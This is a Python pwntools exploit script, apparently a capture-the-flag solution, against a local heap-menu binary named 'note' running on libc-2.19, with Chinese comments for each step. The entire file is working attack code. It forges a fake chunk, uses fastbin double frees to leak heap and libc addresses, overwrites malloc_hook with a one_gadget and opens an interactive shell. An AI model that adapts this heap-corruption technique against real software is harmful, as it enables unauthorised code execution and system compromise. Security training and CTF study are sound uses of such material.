#!usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

#context(os='linux', arch='amd64', log_level='debug')
p = process("./note")
libc = ELF("./libc-2.19.so")

def add(data):
    p.recvuntil("choice:")
    p.sendline(str(1))
    p.recvuntil("your note")
    p.send(data)
    p.recvuntil("keep your note?")
    p.send("Y\x00")

def show(idx):
    p.recvuntil("choice:")
    p.sendline(str(2))
    p.recvuntil("show?")
    p.sendline(str(idx))

def dele(idx):
    p.recvuntil("choice:")
    p.sendline(str(3))
    p.recvuntil("delete?")
    p.sendline(str(idx))

def g(p):
    raw_input()
    gdb.attach(p)

## chunk0里面伪造一个0x70大小的chunk，用于覆盖chunk1
    
fake_chunk=p64(0)+p64(0x71)

add(fake_chunk)
add("1")
add("2")
add("other")

# 泄露堆地址，并同时double free，分配到伪造的chunk
# 覆盖chunk1的头字段，将chunk1的size填成(0xe1)非fastbin chunk

dele(2)
dele(1)
show(1)
p.recvline()
heap_base = u64(p.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0xe0
print "heap_base : " +hex(heap_base)
dele(2)

add(p64(heap_base+0x10))
add("f")
add("g")
add("h"*0x50+p64(0)+p64(0xe1))

## 释放chunk1 进入Unsorted Bin，泄露libc

dele(1)
show(1)
p.recvline()
libc_base= u64(p.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x58-0x3c2760
print "libc_base : " +hex(libc_base)

malloc_hook=libc_base+0x3C2740
#realloc=libc_base+0x83220
one_gadget=libc_base+0xe9415
#print "realloc : " +hex(realloc)
print "malloc_hook : " +hex(malloc_hook)
print "one_gadget : " +hex(one_gadget)

## 再次使用double free ，控制malloc_hook地址并覆盖成one_gadget

add("1")
add("2")
dele(2)
dele(1)
dele(2)

add(p64(malloc_hook-0x23))
add("f")
add("g")
#add('\x00'*0x3+p64(one_gadget)+p64(0)+p64(realloc+0xb))
add('\x00'*0x13+p64(one_gadget))

###  get shell

#g(p)
p.recvuntil("choice:")
p.sendline(str(1))


p.interactive()
